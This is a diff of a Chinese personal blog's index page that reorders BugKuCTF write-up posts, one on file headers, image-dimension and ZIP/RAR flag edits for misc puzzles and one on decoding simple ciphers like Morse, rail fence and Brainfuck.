+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.压缩源文件数据区：</span><br><span class="line">开头也就是前面内容提到，ZIP文件开头标识：</span><br><span class="line">50 4B 03 04</span><br><span class="line"></span><br><span class="line">2.压缩源文件目录区：</span><br><span class="line">50 4B 01 02：目录中文件文件头标记</span><br><span class="line">3F 00：压缩使用的 pkware 版本 </span><br><span class="line">14 00：解压文件所需 pkware 版本 </span><br><span class="line">00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</span><br><span class="line"></span><br><span class="line">3.压缩源文件目录结束标志 ：</span><br><span class="line">50 4B 05 06</span><br></pre></td></tr></table></figure>
+<p>简单创建一个flag.txt，压缩成ZIP格式并且不设密码，用winhex打开，全局方式位标识确实是00 00</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/11-1.png" alt="11-1"></p>
+<p>修改后，再次想要解压时，就提示需要输入密码了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/11-2.png" alt="11-2"></p>
+<h4 id="RAR文件"><a href="#RAR文件" class="headerlink" title="RAR文件"></a>RAR文件</h4><p>涉及题目：分析题第五题</p>
+<p>RAR文件的伪加密比较少见，没有深入调查，只根据题目做简单的介绍</p>
+<p>方法：将文件头0x1674后面的0x84改为0x80（84为加密，80/20不加密）</p>
+<hr>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">CTF杂项</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-BugKuCTF—加密题 第1-10关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/03/30/BugKuCTF—加密题 第1-10关/">BugKuCTF — 加密题(第1-10关)</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/03/30/BugKuCTF—加密题 第1-10关/" class="archive-article-date">
+  	<time datetime="2019-03-29T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-30</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="第一关（滴答-滴）"><a href="#第一关（滴答-滴）" class="headerlink" title="第一关（滴答~滴）"></a>第一关（滴答~滴）</h3><p>百度一下题目给的数字，发现是摩斯密码</p>
+<p><img src alt="1-1"></p>
+<p>在线解密一下</p>
+<p><img src alt="1-2"></p>
+<p>提交就对了</p>
+<p><img src alt="1-3"></p>
+<hr>
+<h3 id="第二关（聪明的小羊）"><a href="#第二关（聪明的小羊）" class="headerlink" title="第二关（聪明的小羊）"></a>第二关（聪明的小羊）</h3><p>题目提示很明显了：栅栏密码</p>
+<p><img src alt="2-1"></p>
+<p>用Python写个脚本</p>
+<p><img src alt="2-2"></p>
+<p>跑一下flag直接出来</p>
+<p><img src alt="2-3"></p>
+<p>也可以使用网站：<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="noopener">栅栏密码在线加密解密</a></p>
+<hr>
+<h3 id="第三关（ok）"><a href="#第三关（ok）" class="headerlink" title="第三关（ok）"></a>第三关（ok）</h3><p>好多的ok，那么这个就是<strong>Ook!编码</strong></p>
+<p><img src alt="3-1"></p>
+<p>找个在线解码网站：<a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">Brainfuck/Ook在线加密解密</a></p>
+<p><img src alt="3-2"></p>
+<p>flag直接解出来</p>
+<p><img src alt="3-3"></p>
+<hr>
+<h3 id="第四关（这不是摩斯密码）"><a href="#第四关（这不是摩斯密码）" class="headerlink" title="第四关（这不是摩斯密码）"></a>第四关（这不是摩斯密码）</h3><p>打开看一下，发现是<strong>Brainfuck编码</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;</span><br><span class="line">++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++[- &gt;---&lt; ]&gt;--- .---- .&lt;+++ ++++[ -&gt;--- ----&lt;</span><br><span class="line">]&gt;--- ----- ----- .&lt;+++ ++++[ -&gt;+++ ++++&lt; ]&gt;+++ ++.&lt;+ +++++ +[-&gt;- -----</span><br><span class="line">-&lt;]&gt;. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. &lt;++++ +++[-</span><br><span class="line">&gt;---- ---&lt;] &gt;---- ----. +++++ +..++ +++.+ .&lt;+++ [-&gt;-- -&lt;]&gt;- --.&lt;+ +++++</span><br><span class="line">+[-&gt;+ +++++ +&lt;]&gt;+ ++.++ +.+++ +++++ +.--- -.+++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++++</span><br><span class="line">++.&lt;</span><br></pre></td></tr></table></figure>
+<p><img src alt="4-1"></p>
+<p>那就能继续利用上面哪个网站破解</p>
+<p><img src alt="4-2"></p>
+<p>成功解出flag</p>
+<p><img src alt="4-3"></p>
+<hr>
+<h3 id="第五关（easy-crypto）"><a href="#第五关（easy-crypto）" class="headerlink" title="第五关（easy_crypto）"></a>第五关（easy_crypto）</h3><p>二进制密码</p>
+<p><img src alt="5-1"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">CTF加密</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/03/30/BugKuCTF—加密题 第1-10关/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-CTF比赛—2019“嘉韦思杯”上海高校网络安全邀请赛初赛WriteUp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1228,214 +1436,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/Knlvre.github-io/2019/03/30/CTF比赛—2019“嘉韦思杯”上海高校网络安全邀请赛初赛WriteUp/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-BugKuCTF—杂项题中常见的文件操作" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/">BugKuCTF — 杂项题中常见的文件知识点和操作</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/" class="archive-article-date">
-  	<time datetime="2019-03-29T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-30</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="常见的文件头"><a href="#常见的文件头" class="headerlink" title="常见的文件头"></a>常见的文件头</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)，文件头：FF D8 FF E0</span><br><span class="line"></span><br><span class="line">PNG (png)，文件头：89 50 4E 47；文件尾：00 00 00 00 49 45 4E 44 AE 42 60 82</span><br><span class="line"></span><br><span class="line">7z：37 7A BC AF 27 1C</span><br><span class="line"></span><br><span class="line">GIF (gif)：47 49 46 38 39 61</span><br><span class="line"></span><br><span class="line">ZIP Archive (zip)：50 4B 03 04</span><br><span class="line"></span><br><span class="line">RAR Archive (rar)：52 61 72 21</span><br><span class="line"></span><br><span class="line">Wave (wav)：57 41 56 45</span><br><span class="line"></span><br><span class="line">AVI (avi)：41 56 49 20</span><br><span class="line"></span><br><span class="line">Real Audio (ram)：2E 72 61 FD</span><br><span class="line"></span><br><span class="line">Real Media (rm)：2E 52 4D 46</span><br><span class="line"></span><br><span class="line">MPEG (mpg)：00 00 01 BA</span><br><span class="line"></span><br><span class="line">MPEG (mpg)：00 00 01 B3</span><br></pre></td></tr></table></figure>
-<hr>
-<h3 id="修改图片的高度和宽度"><a href="#修改图片的高度和宽度" class="headerlink" title="修改图片的高度和宽度"></a>修改图片的高度和宽度</h3><h4 id="PNG图片"><a href="#PNG图片" class="headerlink" title="PNG图片"></a>PNG图片</h4><p>涉及题目：杂项题第三题</p>
-<p>图片格式：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">（固定）：8个字节（0-7），89 50 4E 47 0D 0A 1A 0A为png的文件头</span><br><span class="line"></span><br><span class="line">（固定）：4个字节（8-b），00 00 00 0D（即为十进制的13）代表数据块的长度为13</span><br><span class="line"></span><br><span class="line">（固定）：4个字节（c-f），49 48 44 52（即为ASCII码的IHDR）,文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。文件头数据块由13字节组成，</span><br><span class="line"></span><br><span class="line">（可变）：13个字节（0-c），这13个字节既文件头数据块。1.前4个字节代表该图片的宽；2.后4个字节代表该图片的高；3.后5个字节依次为：Bit depth、ColorType、Compression method、Filter method、Interlace method</span><br><span class="line"></span><br><span class="line">（可变）：剩余三字节为该png的CRC检验码，由从IDCH到IHDR的十七位字节进行CRC计算得到</span><br></pre></td></tr></table></figure>
-<p>所以，撇掉前16个字节（第一行）后，修改第17-20字节为修改高度，修改第21-24字节为修改宽度</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/2-3.png" alt></p>
-<h4 id="JPEG图片"><a href="#JPEG图片" class="headerlink" title="JPEG图片"></a>JPEG图片</h4><p>涉及题目：杂项题第二十九题</p>
-<p>图片格式：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FFD8：图片起始标示位</span><br><span class="line">FFC0：SOFO，Start of Frame，帧图像开始，修改高度宽度应注意的标示位</span><br><span class="line">FFD9：图片结束标识位</span><br></pre></td></tr></table></figure>
-<p>JPEG（JPG）图片的高度和宽度的位置不像PNG图片那样是固定的</p>
-<p>而是根据图片的不同而不同位置，但是却也有规律可以找</p>
-<p>修改JPG图片的高度和宽度要找0xFFC0（SOFO，Start of Frame，帧图像开始）标示位，然后往后第4字节开始，前2个字节是图片高度，后2个字节是图片宽度。但要注意的是也有图片需要找0xFFC2，就像第二十九题</p>
-<p>所以使用winhex的情况下，搜索Hex值（Ctrl+Alt+X）：FFC0或FFC2，一般位置比较靠前</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-7.png" alt></p>
-<p>标示位往后第4字节开始，前2个字节是图片高度，后2个字节是图片宽度</p>
-<p>如下图：66是高度，781是宽度，和图片属性里面的一样</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-8.png" alt></p>
-<hr>
-<h3 id="压缩文件伪加密"><a href="#压缩文件伪加密" class="headerlink" title="压缩文件伪加密"></a>压缩文件伪加密</h3><h4 id="ZIP文件"><a href="#ZIP文件" class="headerlink" title="ZIP文件"></a>ZIP文件</h4><p>讲到伪加密，需要对ZIP文件的格式加上一些的补充：</p>
-<p>一格zip文件有三个部分组成：压缩源文件数据区 + 压缩源文件目录区 + 压缩源文件目录结束标志</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.压缩源文件数据区：</span><br><span class="line">开头也就是前面内容提到，ZIP文件开头标识：</span><br><span class="line">50 4B 03 04</span><br><span class="line"></span><br><span class="line">2.压缩源文件目录区：</span><br><span class="line">50 4B 01 02：目录中文件文件头标记</span><br><span class="line">3F 00：压缩使用的 pkware 版本 </span><br><span class="line">14 00：解压文件所需 pkware 版本 </span><br><span class="line">00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</span><br><span class="line"></span><br><span class="line">3.压缩源文件目录结束标志 ：</span><br><span class="line">50 4B 05 06</span><br></pre></td></tr></table></figure>
-<p>简单创建一个flag.txt，压缩成ZIP格式并且不设密码，用winhex打开，全局方式位标识确实是00 00</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/11-1.png" alt="11-1"></p>
-<p>修改后，再次想要解压时，就提示需要输入密码了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/11-2.png" alt="11-2"></p>
-<h4 id="RAR文件"><a href="#RAR文件" class="headerlink" title="RAR文件"></a>RAR文件</h4><p>涉及题目：分析题第五题</p>
-<p>RAR文件的伪加密比较少见，没有深入调查，只根据题目做简单的介绍</p>
-<p>方法：将文件头0x1674后面的0x84改为0x80（84为加密，80/20不加密）</p>
-<hr>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">CTF杂项</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-BugKuCTF—加密题 第1-10关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/03/30/BugKuCTF—加密题 第1-10关/">BugKuCTF — 加密题(第1-10关)</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/03/30/BugKuCTF—加密题 第1-10关/" class="archive-article-date">
-  	<time datetime="2019-03-29T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-30</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="第一关（滴答-滴）"><a href="#第一关（滴答-滴）" class="headerlink" title="第一关（滴答~滴）"></a>第一关（滴答~滴）</h3><p>百度一下题目给的数字，发现是摩斯密码</p>
-<p><img src alt="1-1"></p>
-<p>在线解密一下</p>
-<p><img src alt="1-2"></p>
-<p>提交就对了</p>
-<p><img src alt="1-3"></p>
-<hr>
-<h3 id="第二关（聪明的小羊）"><a href="#第二关（聪明的小羊）" class="headerlink" title="第二关（聪明的小羊）"></a>第二关（聪明的小羊）</h3><p>题目提示很明显了：栅栏密码</p>
-<p><img src alt="2-1"></p>
-<p>用Python写个脚本</p>
-<p><img src alt="2-2"></p>
-<p>跑一下flag直接出来</p>
-<p><img src alt="2-3"></p>
-<p>也可以使用网站：<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="noopener">栅栏密码在线加密解密</a></p>
-<hr>
-<h3 id="第三关（ok）"><a href="#第三关（ok）" class="headerlink" title="第三关（ok）"></a>第三关（ok）</h3><p>好多的ok，那么这个就是<strong>Ook!编码</strong></p>
-<p><img src alt="3-1"></p>
-<p>找个在线解码网站：<a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">Brainfuck/Ook在线加密解密</a></p>
-<p><img src alt="3-2"></p>
-<p>flag直接解出来</p>
-<p><img src alt="3-3"></p>
-<hr>
-<h3 id="第四关（这不是摩斯密码）"><a href="#第四关（这不是摩斯密码）" class="headerlink" title="第四关（这不是摩斯密码）"></a>第四关（这不是摩斯密码）</h3><p>打开看一下，发现是<strong>Brainfuck编码</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;</span><br><span class="line">++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++[- &gt;---&lt; ]&gt;--- .---- .&lt;+++ ++++[ -&gt;--- ----&lt;</span><br><span class="line">]&gt;--- ----- ----- .&lt;+++ ++++[ -&gt;+++ ++++&lt; ]&gt;+++ ++.&lt;+ +++++ +[-&gt;- -----</span><br><span class="line">-&lt;]&gt;. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. &lt;++++ +++[-</span><br><span class="line">&gt;---- ---&lt;] &gt;---- ----. +++++ +..++ +++.+ .&lt;+++ [-&gt;-- -&lt;]&gt;- --.&lt;+ +++++</span><br><span class="line">+[-&gt;+ +++++ +&lt;]&gt;+ ++.++ +.+++ +++++ +.--- -.+++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++++</span><br><span class="line">++.&lt;</span><br></pre></td></tr></table></figure>
-<p><img src alt="4-1"></p>
-<p>那就能继续利用上面哪个网站破解</p>
-<p><img src alt="4-2"></p>
-<p>成功解出flag</p>
-<p><img src alt="4-3"></p>
-<hr>
-<h3 id="第五关（easy-crypto）"><a href="#第五关（easy-crypto）" class="headerlink" title="第五关（easy_crypto）"></a>第五关（easy_crypto）</h3><p>二进制密码</p>
-<p><img src alt="5-1"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">CTF加密</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/03/30/BugKuCTF—加密题 第1-10关/">展开全文 >></a>
         </p>
       
 
@@ -2008,11 +2008,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF加密</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF加密</a>
               </li>
              
               <li class="article-tag-list-item">
